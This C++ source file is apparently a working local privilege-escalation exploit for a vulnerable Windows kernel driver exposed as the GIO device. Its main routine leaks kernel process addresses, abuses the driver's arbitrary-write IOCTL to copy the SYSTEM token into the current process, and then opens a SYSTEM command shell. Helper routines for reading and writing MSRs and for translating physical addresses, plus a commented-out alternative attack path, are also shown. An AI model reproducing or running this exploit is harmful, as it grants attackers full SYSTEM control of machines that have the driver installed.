
// gdrv_exploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>

#define IOCTL_MmGetPhysicalAddress 0xC350280C

/*

For using MmMapIoSpace(), we need to obtain a "Phyiscal Address" as the first argument.
TODO:
    - Research the differences between IOCTL_MmMapIoSpace & IOCTL_MmMapIoSpace2 (The IOCTL number
      isn't 100% clear, but it seems to be 0xC3502840, further research is required).

    - IOCTL_MmMapIoSpace seems to be an "Arbitrary Read" vulnerability

*/

#define IOCTL_MmMapIoSpace         0xC3502000
#define IOCTL_MmMapIoSpace2        0xC3502840

// For readmsr():
// IOCTL IOCTL 0xC3502580
// InputBufferLength == OutputBufferLength && InputBufferLength == 16
// can be used to leak the IA32_LSTAR MSR address 
#define IOCTL_readmsr_caller       0xC3502580   

// For writemsr():
// IOCTL 0xC3502580
// *(DWORD*)PSystemBuffer == 1
// can be used to write the IA32_LSTAR MSR and overwrite KiSystemCall64() address
#define IOCTL_writemsr_caller      0xC3502580   
#define IOCTL_ZwUnmapViewOfSection 0xC3502008

#define IOCTL_ArbitraryWrite 0xC3502808 // ??

#pragma comment(lib, "ntdll")

#define SystemHandleInformation 0x10
//#define SystemHandleInformationSize 1024 * 1024 * 2

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

extern "C" NTSTATUS NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;



ULONG_PTR ReadMSR(DWORD MSRIndex)
{
    printf("[*] in ReadMSR()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return -1;
    }
    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    DWORD* InputBuffer = (DWORD*)calloc(1, 0x10);
    DWORD* OutputBuffer = (DWORD*)calloc(1, 0x10);

    InputBuffer[0] = 1; // 1 is the value that invokes the ReadMSR() function in the driver
    InputBuffer[1] = MSRIndex;

    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_readmsr_caller, InputBuffer, 0x10, OutputBuffer, 0x10, &BytesReturned, nullptr))
    {
        printf("[+] ReadMSR() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_readmsr_caller);

        DWORD HighDWORD = OutputBuffer[3];
        DWORD LowDWORD = OutputBuffer[2];

        UINT64 KiSystemCall64Address = ((UINT64)HighDWORD << 32) | (UINT64)LowDWORD;
        printf("[+] Leaked nt!KiSystemCall64 address: 0x%p\n", KiSystemCall64Address);

        // --- Clearing and returning---
        free(InputBuffer);
        free(OutputBuffer);

        CloseHandle(hDevice);
        return KiSystemCall64Address;
    }

    printf("[-] Unable to call IOCTL 0x%x: GetLastError(): %u\n", GetLastError());

    free(InputBuffer);
    free(OutputBuffer);

    CloseHandle(hDevice);
    return -1;
}

ULONG_PTR LeakNtoskrnlBaseAddress()
{
    DWORD MSRIndex = 0xC0000082;
    ULONG_PTR KiSystemCall64Address = ReadMSR(MSRIndex);
    DWORD IAT_Offset = 0x40C600; // This might be different between versions of Windows !!!

    printf("[+] IAT offset of nt!KiSystemCall64: 0x%x\n", IAT_Offset);

    // ntoskrnl.exe base address can be found in IDA under: Edit -> Segments -> Rebase Program...
    ULONG_PTR BaseAddress = KiSystemCall64Address - IAT_Offset;
    printf("[+] Leaked ntoskrnl.exe base address: 0x%p\n", BaseAddress);

    return BaseAddress;
}

VOID WriteMSR(DWORD MSRIndex, ULONG_PTR Overwrite)
{
    printf("[*] in WriteMSR()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    DWORD* InputBuffer = (DWORD*)calloc(1, 0x10);
    DWORD* OutputBuffer = (DWORD*)calloc(1, 0x10);

    DWORD LowDWORD = (DWORD)(Overwrite & 0xFFFFFFFF);           // obtain lower DWORD of Overwrite variable
    DWORD HighDWORD = (DWORD)((Overwrite >> 32) & 0xFFFFFFFF);  // obtain higher DWORD of Overwrite variable

    InputBuffer[0] = 0;         // 0 is the value that invokes the ReadMSR() function in the driver
    InputBuffer[1] = MSRIndex;  // The MSR register index that we want to overwrite
    InputBuffer[2] = LowDWORD;  // Lower 32-bit value that the MSR will be overwritten with
    InputBuffer[3] = HighDWORD; // Higher 32-bit value that the MSR will be overwritten with

    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_writemsr_caller, InputBuffer, 0x10, OutputBuffer, 0x10, &BytesReturned, nullptr))
    {
        DebugBreak();
        printf("[+] WriteMSR() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_writemsr_caller);
    }
    free(InputBuffer);
    free(OutputBuffer);

    CloseHandle(hDevice);

}

ULONG_PTR GetPhysicalAddress(ULONG_PTR VirtualAddress)
{
    printf("[+] in GetPhysicalAddress()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice2 = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice2 == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return -1;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    ULONG_PTR* InputBuffer = (ULONG_PTR*)calloc(1, 8);      // 8 bytes virtual address to be translated
    ULONG_PTR* OutputBuffer = (ULONG_PTR*)calloc(1, 8);

    //RtlCopyMemory(InputBuffer, &VirtualAddress, )
    DWORD BytesReturned = 0;
    DWORD PhysicalAddress = 0;
    if (DeviceIoControl(hDevice2, IOCTL_MmGetPhysicalAddress, &VirtualAddress, 8, OutputBuffer, 8, &BytesReturned, nullptr))
    {
        PhysicalAddress = *OutputBuffer;
        printf("[+] GetPhysicalAddress() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_MmGetPhysicalAddress);
        printf("[+] Physical Address returned for 0x%p is: 0x%p\n", VirtualAddress, PhysicalAddress);

        free(InputBuffer);
        free(OutputBuffer);
        CloseHandle(hDevice2);
        return PhysicalAddress;
    }

    printf("[-] Unable to execute IOCTL_MmGetPhysicalAddress, GetLastError(): %u\n", GetLastError());
    free(InputBuffer);
    free(OutputBuffer);
    CloseHandle(hDevice2);

    return -1;

}

PVOID LeakProcessAddress(DWORD TargetPID)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);

    PSYSTEM_HANDLE_INFORMATION SystemInformation = NULL;
    NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
    ULONG SystemHandleInformationSize = 0x100000;

    PVOID ObjectAddress = NULL;
    DWORD PID = 0;

    do {
        if (SystemInformation)
            free(SystemInformation);

        SystemInformation = (PSYSTEM_HANDLE_INFORMATION)calloc(1, SystemHandleInformationSize);
        if (!SystemInformation) {
            printf("Memory allocation failed!\n");
            return NULL;
        }

        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
            SystemInformation, SystemHandleInformationSize, &SystemHandleInformationSize);

    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        printf("NtQuerySystemInformation failed with status: 0x%x\n", status);
        free(SystemInformation);
        return NULL;
    }

    for (int i = 0; i < SystemInformation->NumberOfHandles; i++)
    {
        PID = SystemInformation->Handles[i].UniqueProcessId;
        if (PID != TargetPID)
            continue;

        if (SystemInformation->Handles[i].ObjectTypeIndex == 7)
        {
            ObjectAddress = SystemInformation->Handles[i].Object;
            printf("[*] PID: %d | _EPROCESS Object Address: 0x%p\n", PID, ObjectAddress);
            break;
        }
        ;
    }
    if (!ObjectAddress)
        printf("[-] Object Address not found: GetLastError(): %u\n", GetLastError());

    CloseHandle(hProcess);
    free(SystemInformation);

    return ObjectAddress;
}

/*
A bug in the IOCTL, specifically in the way that the first argument is being passed to the memmove() 
(a bug that only moves the lower DWORD of the given address), the IOCTL causes a BugCheck and crashes the system.
If the whole 64-bit address would have moved, the exploit would have worked and we'll receive a SYSTEM shell.

VOID Exploit(ULONG_PTR CurrentProcessObjectAddress,
             ULONG_PTR SystemTokenPhysicalAddress,
             ULONG_PTR CurrentProcessTokenAddress)
{
    printf("[+] In Exploit()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    printf("[*] Exploit Handle value: 0x%p\n", hDevice);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");


    //PVOID CurrentProcessObjectAddress = LeakProcessAddress(GetCurrentProcessId());
    //PVOID SystemProcessObjectAddress = LeakProcessAddress((DWORD)4); // SYSTEM's PID = 4

    //printf("[*] SYSTEM Process Base Address: 0x%p\n", SystemProcessObjectAddress);
    //printf("[*] Current Process Base Address: 0x%p\n", CurrentProcessObjectAddress);


    //ULONG_PTR SystemTokenAddress = (ULONG_PTR)SystemProcessObjectAddress + 0x4b8;
    //ULONG_PTR  CurrentProcessTokenAddress = (ULONG_PTR)CurrentProcessObjectAddress + 0x4b8;

    //printf("[*] SYSTEM Token Virtual Address: 0x%p\n", SystemTokenAddress);
    //printf("[*] Local Process Token Virtual Address: 0x%p\n", CurrentProcessTokenAddress);


    ULONG_PTR* InputBuffer = (ULONG_PTR*)calloc(1, 0x40);      // 8 bytes virtual address to be translated
    ULONG_PTR* OutputBuffer = (ULONG_PTR*)calloc(1, 0x40);
    printf("[*] User-Mode Virtual Address of InputBuffer: 0x%p\n", InputBuffer);

    DWORD AddressSize = 8;

    // 5th byte is being truncated because in GetPhysicalAddress()'s IOCTL because:
    // Irp->IoStatus.Information = 4 bytes
    printf("[*] SYSTEM Token Physical Address: 0x%p\n", SystemTokenPhysicalAddress);  
    
    RtlCopyMemory((BYTE*)InputBuffer + 8, &SystemTokenPhysicalAddress, 8);
    RtlCopyMemory((BYTE*)InputBuffer + 20, &AddressSize, 4);
    RtlCopyMemory((BYTE*)InputBuffer + 24, &CurrentProcessTokenAddress, 8);

    printf("InputBuffer[0]: %p\n", InputBuffer[0]);
    printf("InputBuffer[1]: %p\n", InputBuffer[1]);
    printf("InputBuffer[2]: %p\n", InputBuffer[2]);
    printf("InputBuffer[3]: %p\n", InputBuffer[3]);
    printf("InputBuffer[4]: %p\n", InputBuffer[4]);
    
    //DebugBreak();
    
    printf("[*] Debug: getting into DeviceIoControl() request\n");
    DWORD BytesReturned = 0;
    //DebugBreak();
    if (DeviceIoControl(hDevice, IOCTL_MmMapIoSpace, InputBuffer, 0x40, OutputBuffer, 0x40, &BytesReturned, nullptr))
        printf("[+] Exploit() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_MmMapIoSpace);
    DebugBreak();

    CloseHandle(hDevice);
    free(InputBuffer);
    free(OutputBuffer);
}

*/

/*
PVOID MemoryMapper(ULONG_PTR PhysicalAddress)
{
    printf("[*] In MemoryMapper()...\nPress Enter to continue...");
    getchar();


    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return nullptr;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    PVOID MappedAddress = nullptr;
    DWORD* InputBuffer = (DWORD*)calloc(1, 16);      // 8 bytes virtual address to be translated
    ULONG_PTR* OutputBuffer = (ULONG_PTR*)calloc(1, 16);
    DWORD NumberOfBytes = 0xa40;

    RtlCopyMemory((BYTE*)InputBuffer, &PhysicalAddress, 8);   // IoAllocateMdl() -> "PhysicalAddress" argument 
    RtlCopyMemory((BYTE*)InputBuffer+8, &NumberOfBytes, 4);   // IoAllocateMdl() -> "NumberOfBytes" argument 

    printf("[+] Debug: before DeviceIoControl()...\n");
    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_MmMapIoSpace2, InputBuffer, 16, OutputBuffer, 16, &BytesReturned, nullptr))
    {
        if (*OutputBuffer)
        {
            printf("[+] Mapped Memory Address: 0x%p\n", *OutputBuffer);
            MappedAddress = (PVOID)*OutputBuffer;
            free(InputBuffer);
            free(OutputBuffer);
            CloseHandle(hDevice);
            return MappedAddress;
        }
        else
        {
            printf("[-] Error executing DeviceIoControl() -> GetLastError(): %u\n", GetLastError());
            free(InputBuffer);
            free(OutputBuffer);
            CloseHandle(hDevice);
            return 0;
        }

    }

    printf("[-] Error executing DeviceIoControl() -> GetLastError(): %u\n", GetLastError());
    return 0;

}
*/

VOID ArbitraryWrite(ULONG_PTR SrcAddress, ULONG_PTR DstAddress, ULONG_PTR Size)
{
    printf("[*] In ArbitraryWrite()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    printf("[*] SrcAddress: 0x%p\n", SrcAddress);
    printf("[*] DstAddress: 0x%p\n", DstAddress);
    printf("[*] Size: 0x%p\n", Size);

    ULONG_PTR* InputBuffer = (ULONG_PTR*)calloc(1, 24);
    
    RtlCopyMemory((BYTE*)InputBuffer, &DstAddress, 8);
    RtlCopyMemory((BYTE*)InputBuffer + 8, &SrcAddress, 8);
    RtlCopyMemory((BYTE*)InputBuffer + 16, &Size, 4);

    printf("[*] InputBuffer[0]: %p\n", InputBuffer[0]);
    printf("[*] InputBuffer[1]: %p\n", InputBuffer[1]);
    printf("[*] InputBuffer[2]: %p\n", InputBuffer[2]);

    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_ArbitraryWrite, InputBuffer, 24, nullptr, 0, &BytesReturned, nullptr))
        printf("[+] DeviceIoControl() on 0x%x executed successfully!\n", IOCTL_ArbitraryWrite);
    else
        printf("[-] DeviceIoControl() on 0x%x failed with GetLastError(): %u\n", GetLastError());

    free(InputBuffer);
    CloseHandle(hDevice);
}


int main()
{
    printf("[*] Starting execution...\n");
    /*
    //ULONG_PTR BaseAddress = LeakNtoskrnlBaseAddress();

    // Overwriting IA32_LSTAR MSR with KUSER_SHARED_DATA base address
    // Will cause a BSOD!!
    //WriteMSR(0xC0000082, 0xfffff78000000000); 

    //DWORD KUSER_VirtualAddress = GetPhysicalAddress(0xfffff78000000000);
    //printf("Physical Address from main(): 0x%x\n", KUSER_VirtualAddress);
    */
    PVOID CurrentProcessObjectAddress = LeakProcessAddress(GetCurrentProcessId());
    PVOID SystemProcessObjectAddress = LeakProcessAddress((DWORD)4); // SYSTEM's PID = 4

    printf("[*] Current Process _EPROCESS (Virtual) Address: 0x%p\n", CurrentProcessObjectAddress);
    printf("[*] SYSTEM Process _EPROCESS (Virtual) Address: 0x%p\n", SystemProcessObjectAddress);
    
    ULONG_PTR SystemTokenAddress = (ULONG_PTR)SystemProcessObjectAddress + 0x4b8;
    ULONG_PTR CurrentProcessTokenAddress = (ULONG_PTR)CurrentProcessObjectAddress + 0x4b8;
    ULONG_PTR Size = 8;
    printf("[*] SYSTEM Token Address: 0x%p\n", SystemTokenAddress);
    printf("[*] Local Process Token Address: 0x%p\n", CurrentProcessTokenAddress);

    /*
    //ULONG_PTR CurrentProcessPhysicalAddress = GetPhysicalAddress((ULONG_PTR)CurrentProcessObjectAddress);
    //ULONG_PTR SystemProcessPhysicalAddress = GetPhysicalAddress((ULONG_PTR)SystemProcessObjectAddress);

    //CurrentProcessPhysicalAddress = CurrentProcessPhysicalAddress | 0x100000000;
    //SystemProcessPhysicalAddress = SystemProcessPhysicalAddress | 0x100000000;

    //printf("[*] Current Process _EPROCESS Physical Address: 0x%p\n", CurrentProcessPhysicalAddress);
    //printf("[*] SYSTEM Process _EPROCESS Physical Address: 0x%p\n", SystemProcessPhysicalAddress);

    //ULONG_PTR SystemTokenPhysicalAddress = GetPhysicalAddress(SystemTokenAddress);
    //SystemTokenPhysicalAddress = (SystemTokenPhysicalAddress | 0x100000000);
    //printf("[*] SYSTEM Token Physical Address: 0x%p\n", SystemTokenPhysicalAddress);

    //ULONG_PTR LocalTokenPhysicalAddress = GetPhysicalAddress(CurrentProcessTokenAddress);
    //printf("[*] Local Token Physical Address: 0x%p\n", (LocalTokenPhysicalAddress | 0x100000000));

    //PVOID MappedAddress = MemoryMapper(SystemProcessPhysicalAddress);
    printf("cmd.exe before the exploit:\n");
    system("cmd.exe");
    */

    ArbitraryWrite(SystemTokenAddress, CurrentProcessTokenAddress, Size);
    printf("[+] Successfully overwritten Local Process Token with SYSTEM process Token!!\n");
    printf("[+] Press Enter to get SYSTEM shell...\n");
    getchar();
    system("cmd.exe");

    return 0;
}



